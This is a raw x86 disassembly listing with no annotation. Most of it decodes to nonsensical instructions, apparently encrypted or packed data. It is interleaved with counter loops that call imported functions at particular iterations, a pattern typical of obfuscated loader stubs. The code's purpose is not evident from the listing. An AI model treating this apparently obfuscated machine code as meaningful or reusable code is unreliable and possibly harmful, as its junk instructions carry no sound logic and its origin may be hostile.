  40e1b4:	pop    esp
  40e1b5:	das    
  40e1b6:	repnz pushf 
  40e1b8:	scas   eax,DWORD PTR es:[edi]
  40e1b9:	xor    BYTE PTR [edx-0x611ba9dc],0x86
  40e1c0:	lods   al,BYTE PTR ds:[esi]
  40e1c1:	fsubr  QWORD PTR [edx-0x7c]
  40e1c4:	push   es
  40e1c5:	mov    ds:0xefc2cfef,al
  40e1ca:	pushf  
  40e1cb:	mov    ebx,DWORD PTR [eax+0x53]
  40e1ce:	mov    DWORD PTR [eax],edx
  40e1d0:	ror    bh,cl
  40e1d2:	push   DWORD PTR [eax+ebx*4]
  40e1d5:	out    0x55,al
  40e1d7:	pop    edx
  40e1d8:	or     edi,esp
  40e1da:	fistp  WORD PTR [ebx]
  40e1dc:	sub    ah,BYTE PTR [edi-0x53c5ebf2]
  40e1e2:	cmp    ebp,DWORD PTR [esp+ebx*8]
  40e1e5:	rcr    DWORD PTR [ecx-0x86abd84],0x7
  40e1ec:	pusha  
  40e1ed:	inc    esp
  40e1ee:	pop    ss
  40e1ef:	jae    0x40e1cf
  40e1f1:	sub    BYTE PTR [esi+0x6c866bcd],bh
  40e1f7:	cld    
  40e1f8:	pop    esp
  40e1f9:	int3   
  40e1fa:	cmp    bh,ah
  40e1fc:	dec    edx
  40e1fd:	(bad)  
  40e1fe:	mov    edx,0x4fcea586
  40e203:	scas   al,BYTE PTR es:[edi]
  40e204:	dec    edi
  40e205:	int    0xb8
  40e207:	iret   
  40e208:	in     eax,dx
  40e209:	xchg   edi,eax
  40e20b:	inc    esp
  40e20c:	push   esi
  40e20d:	adc    eax,0x5922d1fd
  40e212:	add    al,0x2a
  40e214:	retf   
  40e215:	stc    
  40e216:	mov    esp,0xe661e0c4
  40e21b:	mov    ebp,0x2087b9fd
  40e220:	or     BYTE PTR [ebp+0x33],0xd4
  40e224:	call   0x59d4:0x3709ff
  40e22b:	add    edx,DWORD PTR [ebx+eiz*2+0x65]
  40e22f:	(bad)  
  40e230:	fisubr DWORD PTR [esi+0x54b2cbaf]
  40e236:	mov    edi,0x9c58eba6
  40e23b:	xor    al,0xf7
  40e23d:	in     eax,0x9d
  40e23f:	inc    edx
  40e240:	or     bl,cl
  40e242:	inc    edx
  40e243:	push   ecx
  40e244:	ins    DWORD PTR es:[edi],dx
  40e245:	mov    ebx,0x854bd312
  40e24a:	sbb    eax,0xcdfb6347
  40e24f:	cmp    al,0x58
  40e251:	call   0xdb13139c
  40e256:	popf   
  40e257:	cs call 0x490e327b
  40e25d:	fcomip st,st(3)
  40e25f:	dec    edi
  40e260:	pusha  
  40e261:	stos   DWORD PTR es:[edi],eax
  40e262:	pushf  
  40e263:	clc    
  40e264:	sbb    ah,cl
  40e266:	jle    0x40e22c
  40e268:	iret   
  40e269:	js     0x40e28d
  40e26b:	jbe    0x40e25a
  40e26d:	xor    al,BYTE PTR ds:0x9240a8b4
  40e273:	cmp    edi,ecx
  40e275:	ins    DWORD PTR es:[edi],dx
  40e276:	inc    eax
  40e277:	fmul   QWORD PTR [eax+0x458d0189]
  40e27d:	cld    
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	sub    DWORD PTR [esi],edx
  40e378:	pushf  
  40e379:	cmp    esp,DWORD PTR fs:[eax+esi*2+0x707fc370]
  40e381:	jo     0x40e374
  40e383:	dec    ebx
  40e384:	or     DWORD PTR [esi-0x26],0xbcb2223b
  40e38b:	pop    esi
  40e38c:	mov    ecx,0x22604b7f
  40e391:	test   al,0xdf
  40e393:	mov    al,cl
  40e395:	push   edi
  40e396:	cdq    
  40e397:	or     dl,al
  40e399:	adc    BYTE PTR [ecx+0x2401c40c],dh
  40e39f:	fnstsw WORD PTR [esi-0x5367656b]
  40e3a5:	jne    0x40e3b6
  40e3a7:	loop   0x40e333
  40e3a9:	clc    
  40e3aa:	mov    eax,ds:0xbfdb30d4
  40e3af:	in     al,dx
  40e3b0:	mov    eax,ds:0x7121aa70
  40e3b5:	inc    esp
  40e3b6:	sbb    al,0x7d
  40e3b8:	je     0x40e439
  40e3ba:	or     al,0x2b
  40e3bc:	mov    dl,0x9e
  40e3be:	popa   
  40e3bf:	loopne 0x40e370
  40e3c1:	dec    eax
  40e3c2:	leave  
  40e3c3:	in     eax,0xfe
  40e3c5:	leave  
  40e3c6:	loop   0x40e42a
  40e3c8:	jecxz  0x40e356
  40e3ca:	pop    es
  40e3cb:	xchg   edx,eax
  40e3cc:	daa    
  40e3cd:	je     0x40e418
  40e3cf:	xchg   esp,eax
  40e3d0:	dec    ebx
  40e3d1:	mov    ebx,0x1234a9cf
  40e3d6:	jge    0x40e36f
  40e3d8:	ret    
  40e3d9:	xchg   ecx,eax
  40e3da:	or     esp,DWORD PTR [edx-0x7047b917]
  40e3e0:	shr    BYTE PTR [esi-0x705fbdf5],0x81
  40e3e7:	shl    BYTE PTR [ebp+0x4145934e],0xfa
  40e3ee:	out    0x1d,eax
  40e3f0:	mov    bl,BYTE PTR [ebp*8+0x244f5186]
  40e3f7:	jecxz  0x40e3db
  40e3f9:	push   0xffffffb8
  40e3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fc:	fisub  WORD PTR [esi+0x34817706]
  40e402:	sub    BYTE PTR [edi+0x71b2503f],cl
  40e408:	jl     0x40e399
  40e40a:	xor    DWORD PTR [eax+eax*4+0x28],esi
  40e40e:	std    
  40e40f:	hlt    
  40e410:	aad    0xe5
  40e412:	add    BYTE PTR [edx-0x45],bh
  40e415:	push   ebx
  40e416:	sub    al,0xcd
  40e418:	push   0xfffffff0
  40e41a:	jae    0x40e3aa
  40e41c:	je     0x40e405
  40e41e:	jge    0x40e481
  40e420:	ret    0xfe90
  40e423:	dec    esp
  40e424:	push   es
  40e425:	push   esi
  40e426:	js     0x40e429
  40e428:	dec    eax
  40e429:	out    0x4,eax
  40e42b:	loop   0x40e3d8
  40e42d:	clc    
  40e42e:	imul   ecx,DWORD PTR [ebp-0x25],0xc0c84a21
  40e435:	test   eax,0x96ab2864
  40e43a:	xchg   bh,bh
  40e43c:	leave  
  40e43d:	int3   
  40e43e:	mov    ds:0x4b203eee,al
  40e443:	loope  0x40e411
  40e445:	ins    DWORD PTR es:[edi],dx
  40e446:	sbb    BYTE PTR [edx+0x59],dl
  40e449:	inc    ebx
  40e44a:	rol    DWORD PTR [edx],cl
  40e44c:	jns    0x40e4c1
  40e44e:	jge    0x40e464
  40e450:	push   esi
  40e451:	(bad)  
  40e452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e453:	sub    eax,0x91774063
  40e458:	sbb    eax,0x3122b46
  40e45d:	cmp    al,0x8b
  40e45f:	and    esp,DWORD PTR [eax+0x3cc19fbc]
  40e465:	stos   DWORD PTR es:[edi],eax
  40e466:	cmp    bh,ah
  40e468:	sbb    BYTE PTR [edi+0x1ba22452],0x5e
  40e46f:	pavgb  mm7,QWORD PTR [ebx-0x60]
  40e473:	xchg   DWORD PTR [esi-0x31b7df50],esp
  40e479:	dec    esp
  40e47a:	leave  
  40e47b:	cmp    DWORD PTR [ebx+eax*1-0x5a170e21],edx
  40e482:	cmp    esp,edx
  40e484:	dec    ebp
  40e485:	jl     0x40e426
  40e487:	xor    BYTE PTR [ecx+0x69cf058d],ah
  40e48d:	add    bh,dh
  40e48f:	mov    ecx,0xa89d5a64
  40e494:	imul   esi,DWORD PTR [edi],0x70
  40e497:	xlat   BYTE PTR ds:[ebx]
  40e498:	sbb    al,0x3a
  40e49a:	jmp    0xa48e775
  40e49f:	out    dx,eax
  40e4a0:	sahf   
  40e4a1:	mov    al,ds:0xf2acecc6
  40e4a6:	test   al,0x82
  40e4a8:	inc    edx
  40e4a9:	sub    BYTE PTR [edx],dl
  40e4ab:	sub    BYTE PTR [ebp+0x3dbf5edc],dl
  40e4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4b2:	mov    edi,0x7812cf43
  40e4b7:	dec    edx
  40e4b8:	push   es
  40e4b9:	fimul  DWORD PTR [ebp-0x683bfd30]
  40e4bf:	and    eax,0x3d534f2f
  40e4c4:	outs   dx,BYTE PTR ds:[esi]
  40e4c5:	data16 int 0x8a
  40e4c8:	add    esi,esp
  40e4ca:	cld    
  40e4cb:	cld    
  40e4cc:	push   ebx
  40e4cd:	push   es
  40e4ce:	mov    esi,0x31e845c7
  40e4d3:	test   DWORD PTR [eax+edi*8+0x399ae381],ebx
  40e4da:	add    BYTE PTR [eax],al
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x89cd740f
  40e4f5:	adc    bl,bl
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	mov    edi,0x7b6a95f3
  40e504:	aad    0xbe
  40e506:	fwait
  40e507:	rol    ebp,cl
  40e509:	push   esp
  40e50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e50b:	stos   BYTE PTR es:[edi],al
  40e50c:	fdiv   QWORD PTR [edi]
  40e50e:	xor    DWORD PTR [eax+0x46],edx
  40e511:	or     ah,ah
  40e513:	pop    es
  40e514:	jbe    0x40e55b
  40e516:	js     0x40e54d
  40e518:	sub    DWORD PTR [ecx+ebp*1],0x22
  40e51c:	test   BYTE PTR [ebx],dh
  40e51e:	inc    ebp
  40e51f:	cmp    DWORD PTR [edi+0x6b],esi
  40e522:	xchg   ecx,eax
  40e523:	sub    cl,BYTE PTR [edi]
  40e525:	(bad)  
  40e526:	jl     0x40e561
  40e528:	cmp    BYTE PTR [edi],0x68
  40e52b:	(bad)  
  40e52c:	call   0xf36c6865
  40e531:	add    BYTE PTR ss:[eax+ebx*8+0x75],ah
  40e536:	shl    eax,1
  40e538:	dec    ecx
  40e539:	test   eax,0x2c21a2e8
  40e53e:	or     DWORD PTR [esi-0xdd202dd],ecx
  40e544:	jo     0x40e5a8
  40e546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e547:	das    
  40e548:	xchg   ecx,eax
  40e549:	or     eax,0xe869c3ea
  40e54e:	(bad)  
  40e54f:	adc    ch,bl
  40e551:	xor    bh,BYTE PTR [esi+0x48b1615d]
  40e557:	je     0x40e517
  40e559:	imul   esi,DWORD PTR [esi+0x17e65044],0x17cb1d59
  40e563:	push   edx
  40e564:	fistp  WORD PTR [ecx]
  40e566:	nop
  40e567:	stos   BYTE PTR es:[edi],al
  40e568:	and    eax,0x77
  40e56b:	or     eax,DWORD PTR [eax]
  40e56d:	and    ebp,esi
  40e56f:	xchg   BYTE PTR ds:0x447bc279,bl
  40e575:	int    0x20
  40e577:	les    edi,FWORD PTR ds:0xc1874221
  40e57d:	push   ebx
  40e57e:	cli    
  40e57f:	adc    eax,DWORD PTR [eax]
  40e581:	pushw  es
  40e583:	popf   
  40e584:	push   cs
  40e585:	outs   dx,DWORD PTR ds:[esi]
  40e586:	gs scas eax,DWORD PTR es:[edi]
  40e588:	dec    ecx
  40e589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e58a:	std    
  40e58b:	(bad)
  40e590:	nop
  40e591:	data16 and cl,0x4c
  40e595:	addr16 std 
  40e597:	pop    ss
  40e598:	or     edx,esp
  40e59a:	stc    
  40e59b:	xchg   esp,eax
  40e59c:	and    eax,0x9bc8a815
  40e5a1:	in     eax,dx
  40e5a2:	cmp    DWORD PTR fs:[esi+esi*1],esi
  40e5a6:	lahf   
  40e5a7:	add    al,0x9e
  40e5a9:	imul   DWORD PTR [ebx-0xe]
  40e5ac:	in     eax,dx
  40e5ad:	gs ret 
  40e5af:	pop    es
  40e5b0:	aad    0x5f
  40e5b2:	dec    ebp
  40e5b3:	ss aam 0xb
  40e5b6:	out    dx,al
  40e5b7:	dec    esp
  40e5b8:	imul   eax,DWORD PTR [ebp-0x1dcc566],0x12
  40e5bf:	scas   eax,DWORD PTR es:[edi]
  40e5c0:	cld    
  40e5c1:	(bad)  
  40e5c3:	sub    BYTE PTR [ebp-0x6319c326],al
  40e5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ca:	ficom  DWORD PTR ds:0xe05daa75
  40e5d0:	in     al,0xf6
  40e5d2:	and    ch,BYTE PTR [ecx-0x498a7608]
  40e5d8:	mov    esp,0xdc9ef7cc
  40e5dd:	ret    0x972b
  40e5e0:	sbb    BYTE PTR fs:[eax],0xe0
  40e5e4:	mov    al,ds:0xa49e81bc
  40e5e9:	and    BYTE PTR [esi-0x310daa79],0xc0
  40e5f0:	mov    ds:0x6e0c0e26,al
  40e5f5:	dec    ebp
  40e5f6:	ins    DWORD PTR es:[edi],dx
  40e5f7:	leave  
  40e5f8:	fwait
  40e5f9:	aad    0x61
  40e5fb:	xchg   ebp,eax
  40e5fc:	js     0x40e65a
  40e5fe:	sub    al,0xe5
  40e600:	test   dh,dl
  40e602:	shr    edi,1
  40e604:	and    BYTE PTR [edi],al
  40e606:	iret   
  40e607:	outs   dx,BYTE PTR ds:[esi]
  40e608:	outs   dx,DWORD PTR ds:[esi]
  40e609:	pop    edx
  40e60a:	mov    ecx,0x5a358d3c
  40e60f:	(bad)  
  40e610:	mov    ds:0xf0b70c18,eax
  40e616:	pop    ss
  40e617:	(bad)  
  40e619:	bnd ret 
  40e61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61c:	mov    cl,BYTE PTR [eax]
  40e61e:	mov    ch,BYTE PTR [edi-0x59]
  40e621:	popf   
  40e622:	in     eax,0xfd
  40e624:	jne    0x40e69f
  40e626:	cld    
  40e627:	push   ds
  40e628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e629:	nop
  40e62a:	cmp    ch,dh
  40e62c:	inc    eax
  40e62d:	xchg   DWORD PTR [ebp-0x33ebd1d6],eax
  40e633:	or     BYTE PTR [esp+edi*8+0x56],0x29
  40e638:	add    BYTE PTR [edx+eiz*4-0x4],dl
  40e63c:	sbb    ebx,DWORD PTR [edi+0x84975ef]
  40e642:	mov    bh,0x12
  40e644:	xchg   edx,ecx
  40e646:	jno    0x40e5d3
  40e648:	and    BYTE PTR [edx],bh
  40e64a:	out    dx,eax
  40e64b:	mov    ecx,0x81e8458b
  40e650:	and    eax,0x42fd7a
  40e655:	add    BYTE PTR [eax],al
  40e657:	add    BYTE PTR [eax],al
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	dec    esp
  40e6db:	inc    edx
  40e6dc:	mov    dl,0x79
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	dec    ebx
  40e6e7:	out    dx,al
  40e6e8:	cld    
  40e6e9:	sub    ebx,DWORD PTR [ebp+0x18929d02]
  40e6ef:	fsubr  DWORD PTR [eax-0x47]
  40e6f2:	ja     0x40e674
  40e6f4:	cs pop ss
  40e6f6:	ficom  WORD PTR [edi]
  40e6f8:	jb     0x40e67e
  40e6fa:	and    al,0x5
  40e6fc:	add    al,0xc4
  40e6fe:	add    cl,BYTE PTR [edi+edx*2]
  40e701:	dec    ebp
  40e702:	loop   0x40e708
  40e704:	cs aad 0xe4
  40e707:	mov    DWORD PTR [ecx-0x781132f8],edi
  40e70d:	push   ecx
  40e70e:	inc    ebp
  40e70f:	out    dx,eax
  40e710:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e712:	leave  
  40e713:	sub    al,0xbc
  40e715:	test   al,0x71
  40e717:	neg    BYTE PTR ds:0x415684f
  40e71d:	pop    ds
  40e71e:	mov    edx,0x8fbb14e7
  40e723:	int3   
  40e724:	pop    esi
  40e725:	xchg   esp,eax
  40e726:	xchg   ecx,eax
  40e727:	aam    0x2a
  40e729:	lds    esp,FWORD PTR [ebx+0x4c4a7ec1]
  40e72f:	push   ds
  40e730:	imul   ebp,ecx,0xf
  40e733:	fadd   DWORD PTR [ebp-0x3fb26fd]
  40e739:	jne    0x40e751
  40e73b:	mov    esp,0xb270024c
  40e740:	cmc    
  40e741:	mov    al,0x99
  40e743:	xchg   BYTE PTR [ecx-0x6d],bh
  40e746:	sahf   
  40e747:	jne    0x40e742
  40e749:	pusha  
  40e74a:	loopne 0x40e72b
  40e74c:	imul   ebp,DWORD PTR [edi],0xbf2ad82c
  40e752:	sub    DWORD PTR [edx-0x12],ebp
  40e755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e756:	mov    al,0x5
  40e758:	pop    edx
  40e759:	dec    esp
  40e75a:	out    dx,eax
  40e75b:	stos   DWORD PTR es:[edi],eax
  40e75c:	sub    eax,DWORD PTR [eax]
  40e75e:	mov    cs,WORD PTR [edx+0x4c]
  40e761:	pop    eax
  40e762:	(bad)
  40e765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e766:	mov    cl,ah
  40e768:	mov    dh,0xb9
  40e76a:	inc    esp
  40e76b:	add    DWORD PTR [eax],esi
  40e76d:	push   cs
  40e76e:	cwde   
  40e76f:	(bad)  
  40e770:	test   esp,esp
  40e772:	cmp    bl,BYTE PTR [ecx]
  40e774:	mov    bl,ch
  40e776:	jno    0x40e71c
  40e778:	mov    ebx,DWORD PTR [esi]
  40e77a:	inc    eax
  40e77b:	adc    al,0xd0
  40e77d:	call   0x54d7:0x6d46e137
  40e784:	dec    esp
  40e785:	bound  eax,QWORD PTR [edi]
  40e787:	int    0x66
  40e789:	dec    edi
  40e78a:	in     al,0xbb
  40e78c:	ds dec ecx
  40e78e:	(bad)  
  40e78f:	jne    0x40e78f
  40e791:	rol    BYTE PTR [edi],0xf2
  40e794:	call   0x8244:0x4f8c655
  40e79b:	push   eax
  40e79c:	xchg   ebx,eax
  40e79d:	pavgb  mm6,mm7
  40e7a0:	xor    cl,BYTE PTR [edx+0x6c145ae5]
  40e7a6:	stos   BYTE PTR es:[edi],al
  40e7a7:	push   0xdfa42a33
  40e7ac:	mov    bl,0x21
  40e7ae:	cld    
  40e7af:	mov    al,ds:0x6ef79b78
  40e7b4:	pop    edi
  40e7b5:	mov    esp,DWORD PTR [ebp-0x611cdd77]
  40e7bb:	mov    edx,DWORD PTR [esp+ebp*8]
  40e7be:	leave  
  40e7bf:	fs retf 
  40e7c1:	push   esi
  40e7c2:	cmc    
  40e7c3:	test   DWORD PTR [ecx],ebp
  40e7c5:	ret    0x802d
  40e7c8:	popa   
  40e7c9:	jmp    0xe5906721
  40e7ce:	sub    al,0x0
  40e7d0:	jecxz  0x40e788
  40e7d2:	mov    dh,0xf0
  40e7d4:	pop    es
  40e7d5:	add    dl,BYTE PTR [ebp+0x314327e4]
  40e7db:	xor    BYTE PTR [ecx],ah
  40e7dd:	xchg   DWORD PTR [bp+di],eax
  40e7e0:	push   0x6f
  40e7e2:	cld    
  40e7e3:	setg   ah
  40e7e6:	cmp    ebx,DWORD PTR [esi]
  40e7e8:	jno    0x40e800
  40e7ea:	sbb    ebp,DWORD PTR [ebx+0x18]
  40e7ed:	imul   BYTE PTR [eax-0x6098bd84]
  40e7f3:	push   ecx
  40e7f4:	fidiv  DWORD PTR [ecx]
  40e7f6:	call   0x9bd518d9
  40e7fb:	dec    ecx
  40e7fc:	xchg   esi,eax
  40e7fd:	adc    al,0xe6
  40e7ff:	pusha  
  40e800:	leave  
  40e801:	adc    eax,0x98121cfd
  40e806:	pop    esp
  40e807:	sbb    eax,0x7fed19a
  40e80c:	pop    es
  40e80d:	les    edi,FWORD PTR [ecx-0x7e]
  40e810:	pop    eax
  40e811:	add    DWORD PTR [ebx-0x7f],esi
  40e814:	sbb    BYTE PTR [eax-0x281340e3],0x8a
  40e81b:	daa    
  40e81c:	fmul   QWORD PTR [ecx-0x63]
  40e81f:	jmp    0x1bc82f8d
  40e824:	add    al,0xdc
  40e826:	and    ebx,DWORD PTR [edx+0x3ea0cd29]
  40e82c:	loop   0x40e837
  40e82e:	jmp    0x40e839
  40e830:	imul   ebp,DWORD PTR [edi+0x65],0x1581008b
  40e837:	jmp    0x67412b38
  40e83c:	push   eax
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	sub    cl,BYTE PTR [edx+0x46]
  40e94c:	in     al,0x24
  40e94e:	mov    al,ds:0x7fc37070
  40e953:	jo     0x40e9c5
  40e955:	sub    al,0xb4
  40e957:	sub    DWORD PTR [ecx-0x7c],eax
  40e95a:	cmp    BYTE PTR [edi],dh
  40e95c:	lods   eax,DWORD PTR ds:[esi]
  40e95d:	cmp    eax,0x29b8376f
  40e962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e963:	push   esp
  40e964:	inc    ebp
  40e965:	push   ebx
  40e966:	add    DWORD PTR [esi],edx
  40e968:	pop    ebx
  40e969:	pop    ebp
  40e96a:	jmp    0x3260:0x9e404ced
  40e971:	imul   ecx,DWORD PTR [ebx-0x1d],0x470f282d
  40e978:	arpl   WORD PTR [edx-0x52],dx
  40e97b:	(bad)  
  40e97c:	rcr    edi,cl
  40e97e:	imul   ebx,DWORD PTR [esi+0x66b33acb],0x18
  40e985:	lods   al,BYTE PTR ds:[esi]
  40e986:	ret    
  40e987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e988:	sbb    eax,0xf3e2397b
  40e98d:	pop    ds
  40e98e:	add    eax,0x8a5b03a9
  40e993:	adc    al,0x3d
  40e995:	nop
  40e996:	(bad)  
  40e997:	fcmovbe st,st(0)
  40e999:	cmp    dl,BYTE PTR [ecx-0x11ff181c]
  40e99f:	xchg   ecx,eax
  40e9a0:	in     al,0x3e
  40e9a2:	adc    bl,BYTE PTR [eax+edx*4+0x72e97a42]
  40e9a9:	fnstenv [ebp+0x2]
  40e9ac:	mov    ds:0xcff127a4,al
  40e9b1:	push   ebx
  40e9b2:	test   DWORD PTR [eax],eax
  40e9b4:	into   
  40e9b5:	inc    edi
  40e9b6:	xchg   ecx,eax
  40e9b7:	fisubr WORD PTR ss:[edi+eax*8+0x582d8529]
  40e9bf:	cli    
  40e9c0:	or     eax,0x69034587
  40e9c5:	icebp  
  40e9c6:	xor    DWORD PTR [esi+ebx*2],ebx
  40e9c9:	repz pop edx
  40e9cb:	push   eax
  40e9cc:	sub    esp,ebp
  40e9ce:	ss aaa 
  40e9d0:	out    dx,al
  40e9d1:	xchg   esp,eax
  40e9d2:	(bad)  [ecx+eax*1]
  40e9d5:	jmp    0x205a:0x6c658a8d
  40e9dc:	ja     0x40e964
  40e9de:	loop   0x40e9db
  40e9e0:	mov    eax,0xf50591e8
  40e9e5:	mov    DWORD PTR [esi+0x7fc30c24],ebx
  40e9eb:	add    DWORD PTR [ebx+0x74],ebp
  40e9ee:	lock dec edi
  40e9f0:	or     eax,0x95f400b2
  40e9f5:	adc    BYTE PTR [edi-0x6d858231],dl
  40e9fb:	cld    
  40e9fc:	xchg   ebx,eax
  40e9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9fe:	jg     0x40e9f9
  40ea00:	pop    ebx
